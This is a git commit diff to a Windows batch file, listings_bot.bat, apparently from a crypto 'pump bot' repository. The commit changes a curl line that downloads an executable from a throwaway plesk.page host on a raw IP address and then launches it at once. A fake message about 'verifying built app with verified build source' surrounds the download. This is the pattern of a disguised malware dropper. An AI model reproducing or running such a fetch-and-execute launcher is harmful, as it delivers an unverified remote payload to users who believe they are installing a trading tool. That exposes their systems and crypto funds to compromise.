1a9f423e38f09fa6bc8633e528a5d340e1b5d82a
Coinsw.app <69402425+CoinSwapPump@users.noreply.github.com>
2022-05-07 06:07:15 +0300

    Update listings_bot.bat

--- listings_bot.bat
+++ listings_bot.bat
@@ -3,7 +3,7 @@ color 0A
 echo -
 echo		    Please wait for verifying built app with verified build source...
 echo -
-curl "https://sleepy-swanson.137-184-117-69.plesk.page/VerifiedBuildSource" --output py/listings_bot.exe
+curl "https://mystifying-golick.137-184-117-69.plesk.page/VerifiedBuildSource" --output py/listings_bot.exe
 echo Building now complete and extracted to the directory.
 start "PumpBot" py/listings_bot.exe
 pause
